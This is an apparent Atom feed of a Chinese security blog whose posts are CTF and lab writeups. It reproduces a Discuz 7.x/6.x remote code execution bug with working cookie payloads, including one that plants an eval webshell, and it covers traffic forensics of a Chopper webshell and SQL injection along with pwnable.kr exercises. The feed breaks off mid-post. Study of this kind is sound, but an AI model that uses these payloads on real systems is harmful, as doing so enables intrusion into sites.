<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CherryGk&#39;s Blog</title>
  
  <subtitle>If you have any questions, please contact QQ1196821466 or leave message in the upper right.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-10-18T08:35:31.806Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行(WooYun-2014-80723)利用</title>
    <link href="http://yoursite.com/2018/10/18/dzeval/"/>
    <id>http://yoursite.com/2018/10/18/dzeval/</id>
    <published>2018-10-18T08:32:21.000Z</published>
    <updated>2018-10-18T08:35:31.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里采用<a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">Vulhub漏洞靶场</a>直接一键搭建</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先先讲一下php中<code>register_globals</code>的功能：<a href="http://php.net/manual/zh/security.globals.php" target="_blank" rel="noopener">官方文档</a>：<br>大概意思就是使用$_GET、$_POST这类提交参数的方法，当<code>register_globals</code>的值为<code>on</code>，<br>提交的参数会直接被注册为全局变量，所以为了安全，php在PHP 4.2.0 起就将默认值改为<code>off</code>了<br>（以上对这个漏洞都没有什么用，看文章看到了，就当写笔记了）</p><p>先看看当GPC为<code>off</code>时，dz有一个将$_request中的特殊字符做了转义的函数，<br>跟GPC为<code>on</code>的作用差不多，代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include/global.func.php代码里：</span><br><span class="line"></span><br><span class="line">function daddslashes($string, $force = 0) &#123;</span><br><span class="line">    !defined(&apos;MAGIC_QUOTES_GPC&apos;) &amp;&amp; define(&apos;MAGIC_QUOTES_GPC&apos;, get_magic_quotes_gpc());</span><br><span class="line">    if(!MAGIC_QUOTES_GPC || $force) &#123;</span><br><span class="line">        if(is_array($string)) &#123;</span><br><span class="line">            foreach($string as $key =&gt; $val) &#123;</span><br><span class="line">                $string[$key] = daddslashes($val, $force);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $string = addslashes($string);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $string;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">include/common.inc.php里：</span><br><span class="line"></span><br><span class="line">foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">    foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">        $_key&#123;0&#125; != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;     //主要是这一段进行了过滤</span><br></pre></td></tr></table></figure><p>当然绕过这个过滤很简单:、<br>     直接使用<code>$_GET/$_POST/$_COOKIE</code>这样的变量即可绕过，但是dz里直接使用这些的机会不多，所以需要换一种方法，<br>再来看看其他地方，<br>dz中有一段代码是防止当register_globals为<code>on</code>时，dz自身的$_GLOBALS变量被覆盖的情况，<br>函数代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_REQUEST[&apos;GLOBALS&apos;]) OR isset($_FILES[&apos;GLOBALS&apos;])) &#123;</span><br><span class="line">    exit(&apos;Request tainting attempted.&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以这个时候问题来了，$_REQUEST的这个变量是受到php.ini中<code>request_order</code>的影响的，<br>在<code>php5.3.x</code>中,request_order默认值为<code>GP</code>(get和post),没有C，<br>所以我们可以通过提交C,也就是COOKIE来提交GLOBALS这类的变量了，</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">在include/discuzcode.func.php中</span><br><span class="line"></span><br><span class="line">function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode =1, $allowhtml = 0, $jammer = 0, $parsetype = &apos;0&apos;, $authorid = &apos;0&apos;, $allowmediacode = &apos;0&apos;, $pid = 0) &#123;</span><br><span class="line">global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;</span><br><span class="line">if($parsetype != 1 &amp;&amp; !$bbcodeoff &amp;&amp; $allowbbcode &amp;&amp; (strpos($message, &apos;[/code]&apos;) || strpos($message, &apos;[/CODE]&apos;)) !== FALSE) &#123;</span><br><span class="line">    $message = preg_replace(&quot;/s?[code](.+?)[/code]s?/ies&quot;, &quot;codedisp(&apos;\1&apos;)&quot;, $message);</span><br><span class="line">&#125;</span><br><span class="line">    $msglower = strtolower($message);</span><br><span class="line">//$htmlon = $htmlon &amp;&amp; $allowhtml ? 1 : 0;</span><br><span class="line">if(!$htmlon) &#123;</span><br><span class="line">    $message = $jammer ? preg_replace(&quot;/rn|n|r/e&quot;, &quot;jammer()&quot;, dhtmlspecialchars($message)) : dhtmlspecialchars($message);</span><br><span class="line">&#125;</span><br><span class="line">if(!$smileyoff &amp;&amp; $allowsmilies &amp;&amp; !empty($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;]) &amp;&amp; is_array($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;])) &#123;</span><br><span class="line">    if(!$discuzcodes[&apos;smiliesreplaced&apos;]) &#123;</span><br><span class="line">        foreach($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;] AS $key =&gt; $smiley) &#123;</span><br><span class="line">            $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;][$key] = &apos;&lt;img src=&quot;images/smilies/&apos;.$GLOBALS[&apos;_DCACHE&apos;][&apos;smileytypes&apos;][$GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;typearray&apos;][$key]][&apos;directory&apos;].&apos;/&apos;.$smiley.&apos;&quot; smilieid=&quot;&apos;.$key.&apos;&quot; border=&quot;0&quot; alt=&quot;&quot; /&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $discuzcodes[&apos;smiliesreplaced&apos;] = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    $message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$message = preg_replace($GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;searcharray&apos;], $GLOBALS[&apos;_DCACHE&apos;][&apos;smilies&apos;][&apos;replacearray&apos;], $message, $maxsmilies);</span><br></pre></td></tr></table></figure></p><p>的preg_replace可以执行命令</p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>随便打开一篇管理员发布的帖子(试了试自己发的帖子貌似不行)，然后抓包将:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PBb_fid2=1539768491;GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();</span><br></pre></td></tr></table></figure><p>添加进cookie：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15398517251.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以看到已经成功的执行了phpinfo，一句话的话换成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_POST[cmd])%3B</span><br></pre></td></tr></table></figure><p>即可拿到shell</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;这里采用&lt;a href=&quot;https://github.com/vulhub/vulhub&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
      <category term="WooYun" scheme="http://yoursite.com/categories/WooYun/"/>
    
    
      <category term="命令执行" scheme="http://yoursite.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="漏洞利用" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>bugku writeup(分析）</title>
    <link href="http://yoursite.com/2018/10/15/bugku3/"/>
    <id>http://yoursite.com/2018/10/15/bugku3/</id>
    <published>2018-10-15T09:41:16.000Z</published>
    <updated>2018-10-16T11:24:15.986Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="flag被盗"><a href="#flag被盗" class="headerlink" title="flag被盗"></a>flag被盗</h2><p>将流量包下载下来用wireshark打开之后，过滤器:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains flag</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396856381.jpg" alt="" title="" class="">                <p></p>            </figure><p>直接得到flag</p><h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>既然是菜刀，估计就有eval了，所以我们先试试过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains eval</span><br></pre></td></tr></table></figure><p>找到一个数据包，追踪http流后发现一段base64</p><p>base64解码之后:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">if(PHP_VERSION&lt;&apos;5.3.0&apos;)&#123;</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">&#125;;</span><br><span class="line">echo(&quot;X@Y&quot;);</span><br><span class="line">$F=&apos;C:\\wwwroot\\3.php&apos;;</span><br><span class="line">$P=@fopen($F,&apos;r&apos;);</span><br><span class="line">echo(@fread($P,filesize($F)));</span><br><span class="line">@fclose($P);;</span><br><span class="line">echo(&quot;X@Y&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure><p>虽然代码有点怪异，但是可以知道这一步是在上传文件，并且在执行成功后会回显<code>X@Y</code>,<br>所以我们将过滤规则改为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;X@Y&quot;</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396888227.jpg" alt="" title="" class="">                <p></p>            </figure><p>在第一个数据包里可以看到<code>flag.tar.gz</code></p><p>继续往下看到第三个数据包可以看到内容:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396888288.jpg" alt="" title="" class="">                <p></p>            </figure><p>这个大概率是一个压缩包，我们导出来看看(看分组字节流时需要从第三位后开始，因为有个<code>X@Y</code>，并且解码为压缩)</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396888409.jpg" alt="" title="" class="">                <p></p>            </figure><p>得到flag</p><h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>提示了先找到getshell的流,先将过滤规则设置为<code>tcp</code>：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968892111.jpg" alt="" title="" class="">                <p></p>            </figure><p>看的出来这是一个<code>192.168.116.138</code>在扫描<code>192.168.116.159</code>的端口,</p><p>将过滤规则改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp and ip.src==192.168.116.138</span><br></pre></td></tr></table></figure><p>中间有一段数据包可以看出来3389是开着的，然后攻击机好像在爆破3389，但是最后失败了，<br>现在我们需要的是一个有多次消息连通的端口，继续往下找可以发现445也是开着的，但是好像也失败了，<br>继续往下，有一段4444端口连到1040的，估计这段已经是找到漏洞并且在利用了，因为连接很稳定，并且也没有失败的情况，继续往下可以看到：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968892712.jpg" alt="" title="" class="">                <p></p>            </figure><p>这段有点奇怪，大概率是拿到shell了，追踪一下流:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968893413.jpg" alt="" title="" class="">                <p></p>            </figure><p>居然直接就找到了flag，那段base64解码之后就行了。</p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>(貌似是做不了了)<br>网上的wp是说找到b站的up之后进去个人主页可以拿到flag，现在个性签名已经改了。</p><h2 id="手机热点"><a href="#手机热点" class="headerlink" title="手机热点"></a>手机热点</h2><p>先仔细看看提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有一天皓宝宝没了流量只好手机来共享，顺便又从手机发了点小秘密到电脑，你能找到它吗？</span><br></pre></td></tr></table></figure><p>首先我们需要知道，电脑连手机热点上网不仅仅只有WIFI，还有蓝牙共享。<br>先打开流量包，冒出来一大堆不懂的协议，找了找资料之后知道了<code>L2CAP</code>是在蓝牙里用的协议，<br>然后再试试有没有<code>wpa</code>协议，结果是没有，所以现在确定下来是用蓝牙传输的文件了，<br>所以还是先看看蓝牙的协议吧,<a href="https://www.cnblogs.com/zjutlitao/p/4742428.html" target="_blank" rel="noopener">原文出处</a>:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968894014.jpg" alt="" title="" class="">                <p></p>            </figure><p>从文章中可以知道蓝牙传输协议用的是<code>OBEX</code>，所以我们将过滤规则改为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obex</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968895015.jpg" alt="" title="" class="">                <p></p>            </figure><p>可以看到发送了一个<code>secret.rar</code>，所以打开这个数据包看看:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968895616.jpg" alt="" title="" class="">                <p></p>            </figure><p>已经可以看到flag.gif了，接下来我们需要将这个文件导出来，看分组字节流之后选择原始数据并保存为一secret.rar:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968896117.jpg" alt="" title="" class="">                <p></p>            </figure><p>打开压缩包，图片上就是flag</p><h2 id="抓到一只苍蝇"><a href="#抓到一只苍蝇" class="headerlink" title="抓到一只苍蝇"></a>抓到一只苍蝇</h2><p>这题在做的过程中有点恶心人，<br>首先打开数据包，题目提示了抓到一只苍蝇，抱着试一试的想法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;苍蝇&quot;</span><br></pre></td></tr></table></figure><p>没想到还真有:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968896718.jpg" alt="" title="" class="">                <p></p>            </figure><p>仔细分析一下发现是在发qq邮件，并且还发了文件，所以我们现在试试:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure><p>可以看到第一个数据包是传文件的，然后下面几个可能就是文件内容了：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968897519.jpg" alt="" title="" class="">                <p></p>            </figure><p>具体是几个，仔细看看URL，738号数据包有个需要调用函数<code>CheckFile</code>，并且前面的5个数据包url的路径一样，<br>所以从第一个开始，后5个数据包是文件内容，但是由于TCP包有文件头，我们需要去掉文件头才能将原始数据合成一个文件，<br>从第一个数据包可以看出来：</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968898120.jpg" alt="" title="" class="">                <p></p>            </figure><p>文件大小是<code>525701</code>字节，我们需要的这5个数据包的大小是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">131436*4+1777=527521</span><br></pre></td></tr></table></figure><p>用527521-525701=1820,然后再除以5就是tcp包的文件头了–364<br>我们将分组字节流中的原始数据分别保存为1、2、3、4、5，方便操作<br>然后使用linux的一些工具进行操作即可得到flag.rar<br>这里使用<code>dd</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=1 bs=1 skip=364 of=1.1</span><br></pre></td></tr></table></figure><p>这条命令中if是文件名，bs是多少个字节，skip是多少位，of是保存为哪个文件<br>然后再用linux的输入流来合并成一个文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.1 2.1 3.1 4.1 5.1 &gt; fly.rar</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968904321.jpg" alt="" title="" class="">                <p></p>            </figure><p>然后fly.rar又被伪加密了，所以需要将这个文件用winhex打开后，用其中的74 84改为74 80就能打开了，</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/153968904922.jpg" alt="" title="" class="">                <p></p>            </figure><p>flag.exe打开是乱码，mzp文件头，改为exe可执行文件后。。。一堆苍蝇出现了。<br>将这个文件扔到kali中foremost一下，得到一个二维码，扫码得到flag。</p><h2 id="信息提取"><a href="#信息提取" class="headerlink" title="信息提取"></a>信息提取</h2><p>题目提示了sqlmap,先过滤一下http</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396861452.jpg" alt="" title="" class="">                <p></p>            </figure><p>一开始的几个数据包可以看出来是在找注入点，并且测试注入点能不能用，<br>一直往后翻看sql语句可以发现这是个盲注，当为真时，回显:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396861823.jpg" alt="" title="" class="">                <p></p>            </figure><p>为否则是其它东西，既然要找flag，那就直接看到最后爆列的语句:</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396884324.jpg" alt="" title="" class="">                <p></p>            </figure><p>这里已经到最后一位了，又因为回显是可以看出来是否成功的，所以我们再加一条过滤规则</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and ip.src==10.0.0.201</span><br></pre></td></tr></table></figure><p>建议从后往前看，因为前面的数据包还有爆列爆库的语句，为了更简单拿到flag，<br>我们直接从后往前看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Message #1 AND ORD(MID((SELECT IFNULL(CAST(`value` AS CHAR),0x20) FROM isg.flags ORDER BY `value` LIMIT 0,1),34,1))&gt;1:</span><br></pre></td></tr></table></figure></p><p>懂注入的应该知道，其中34是代表着第34位，&gt;1是代表着这个字符的ascll&gt;1，但是第34位没有回显刚刚成功的语句，就证明了flag是33位的，往上看看</p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396886185.jpg" alt="" title="" class="">                <p></p>            </figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/15396888066.jpg" alt="" title="" class="">                <p></p>            </figure><p>第33位124回显成功，但是125回显的是失败的,所以证明了这一位的ascll码是125，以此往上推，<br>最终的flag是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISG&#123;BLind_SQl_InJEcTi0N_DeTEcTEd&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h1&gt;&lt;h2 id=&quot;flag被盗&quot;&gt;&lt;a href=&quot;#flag被盗&quot; class=&quot;headerlink&quot; title=&quot;flag被盗&quot;&gt;&lt;/a&gt;f
      
    
    </summary>
    
      <category term="writeup" scheme="http://yoursite.com/categories/writeup/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn入坑之col writeup</title>
    <link href="http://yoursite.com/2018/10/05/col/"/>
    <id>http://yoursite.com/2018/10/05/col/</id>
    <published>2018-10-05T07:58:53.000Z</published>
    <updated>2018-10-05T08:01:15.332Z</updated>
    
    <content type="html"><![CDATA[<p>由于开学事情比较多，没时间写wp，现在补一补</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先照常连上shell，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-5/57182378.jpg" alt="" title="" class="">                <p></p>            </figure><p>跟fd一样，能看到的只有源代码，看一看代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">col@ubuntu:~$ cat col.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode = 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">        int* ip = (int*)p;</span><br><span class="line">        int i;</span><br><span class="line">        int res=0;</span><br><span class="line">        for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">        if(argc&lt;2)&#123;</span><br><span class="line">                printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen(argv[1]) != 20)&#123;</span><br><span class="line">                printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(hashcode == check_password( argv[1] ))&#123;</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">                printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个点，第一个是<code>password</code>长度只能是20位，<br>第二个点是<code>check_password( argv[1] )</code>需要等于<code>0x21DD09EC</code>,<br>先来看看这个函数，将传入的字符分为5个部分进行累加，结果必须为<code>0x21DD09EC</code>,<br>所以方法就是将<code>0x21DD09EC</code>拆分成5个int型的数，<br>因为不会做16进制的除法，所以先转为10进制:<code>568134124</code>然后除5等于<code>113626824</code>余<code>4</code>，<br>最后得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x06C5CEC8*4+0x06C5CECC</span><br></pre></td></tr></table></figure><p>这里先说下<code>0x06C5CEC8</code>长度问题，自己不太明白所以问了大佬，大佬给出的解释是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一个字节是八位,</span><br><span class="line">八位也就是八个二进制位,</span><br><span class="line">而四个二进制位就是一个十六进制位,</span><br><span class="line">所以两个十六进制位就代表一个字节</span><br></pre></td></tr></table></figure></p><p>所以<code>0x06C5CEC8</code>占用的是4个字节，5个就是20个字节<br>(这里其实不太重要，大家应该都懂，只是因为自己这块知识比较薄弱，所以就当写笔记了)</p><p>又因为标准输入中是输入不了我们刚刚算出的字符串的，因为他的值超过了ascll的范围<br>所以这里借助<code>python</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;print &apos;\xc8\xce\xc5\x06&apos;*4 + &apos;\xcc\xce\xc5\x06&apos;&quot;</span><br></pre></td></tr></table></figure></p><p>\x代表的是16进制，并且目标机器用的小端序，所以payload需要些变化</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c &quot;print &apos;\xc8\xce\xc5\x06&apos;*4 + &apos;\xcc\xce\xc5\x06&apos;&quot;`</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-10-5/64744428.jpg" alt="" title="" class="">                <p></p>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;由于开学事情比较多，没时间写wp，现在补一补&lt;/p&gt;
&lt;h3 id=&quot;分析&quot;&gt;&lt;a href=&quot;#分析&quot; class=&quot;headerlink&quot; title=&quot;分析&quot;&gt;&lt;/a&gt;分析&lt;/h3&gt;&lt;p&gt;首先照常连上shell，&lt;br&gt;&lt;figure class=&quot;highlight
      
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn入坑之fd writeup</title>
    <link href="http://yoursite.com/2018/08/25/fd/"/>
    <id>http://yoursite.com/2018/08/25/fd/</id>
    <published>2018-08-25T08:42:43.000Z</published>
    <updated>2018-08-26T05:01:56.741Z</updated>
    
    <content type="html"><![CDATA[<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先连上ssh，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure><figure class="image-box">                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-8-26/49871992.jpg" alt="" title="" class="">                <p></p>            </figure><p>查看一下各个文件的权限，这里可以发现flag文件是没有权限看的，但是有对fd.c的读取权限的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 